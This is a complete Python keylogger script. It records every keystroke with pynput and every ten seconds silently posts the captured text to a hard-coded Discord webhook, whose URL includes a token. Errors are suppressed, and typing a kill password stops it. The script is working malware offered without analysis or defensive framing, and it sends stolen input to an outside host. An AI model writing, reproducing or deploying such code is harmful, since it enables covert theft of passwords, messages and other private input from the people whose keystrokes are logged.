from pynput import keyboard
import requests
import threading

text = ""
buffer = ""  # Stores recent characters
kill_password = "stoplogger"
webhook_url = "https://discord.com/api/webhooks/1354862304818368753/00a1z0gP218HKXXcp2537RR0A635q3H5K0qIBviITk7XjJHsArVx2CadpC5q3WP1VS1f"
time_interval = 10

def send_data():
    global text
    if text:
        data = {
            "content": text,
            'title': 'Keylogger'
        }
        try:
            requests.post(webhook_url, data=data)
        except:
            pass  # Ignore any errors silently
        text = ""  # Clear after sending
    timer = threading.Timer(time_interval, send_data)
    timer.daemon = True
    timer.start()

def on_press(key):
    global text, buffer

    try:
        if key == keyboard.Key.space:
            text += " "
            buffer += " "
        elif key == keyboard.Key.enter:
            text += "\n"
            buffer = ""
        elif key == keyboard.Key.tab:
            text += "\t"
            buffer += "\t"
        elif key == keyboard.Key.backspace:
            text = text[:-1]
            buffer = buffer[:-1]
        elif hasattr(key, 'char') and key.char:
            text += key.char
            buffer += key.char
        else:
            pass
    except:
        pass

    # Limit buffer length
    if len(buffer) > len(kill_password):
        buffer = buffer[-len(kill_password):]

    # Stop if kill password is typed
    if kill_password in buffer:
        print("[Logger stopped by password]")
        return False

with keyboard.Listener(on_press=on_press) as listener:
    send_data()
    listener.join()
